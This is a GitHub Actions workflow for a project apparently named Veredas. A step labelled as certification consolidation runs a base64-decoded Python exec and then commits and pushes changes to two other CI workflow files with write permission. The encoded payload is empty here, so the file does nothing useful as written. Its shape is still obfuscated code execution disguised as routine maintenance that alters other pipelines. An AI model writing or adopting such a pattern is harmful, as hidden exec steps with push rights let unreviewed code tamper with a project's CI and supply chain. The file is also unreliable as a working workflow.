name: Veredas 10.4 Runtime Patch

on:
  push:
    branches:
      - projeto-jornada-snapshots
    paths:
      - '.github/workflows/veredas-104-runtime-patch.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: projeto-jornada-snapshots
          fetch-depth: 0
      - name: Consolidate Phase 10.4 certification chain
        run: |
          python -c "import base64; exec(base64.b64decode(''))"
          git diff --check
          git diff -- .github/workflows/veredas-ci.yml .github/workflows/veredas-enemy-balance.yml
      - name: Commit certification consolidation
        run: |
          git config user.name 'Veredas CI'
          git config user.email 'actions@users.noreply.github.com'
          git add .github/workflows/veredas-ci.yml .github/workflows/veredas-enemy-balance.yml
          git commit -m 'Consolidate Phase 10.4 certification chain'
          git push origin HEAD:projeto-jornada-snapshots
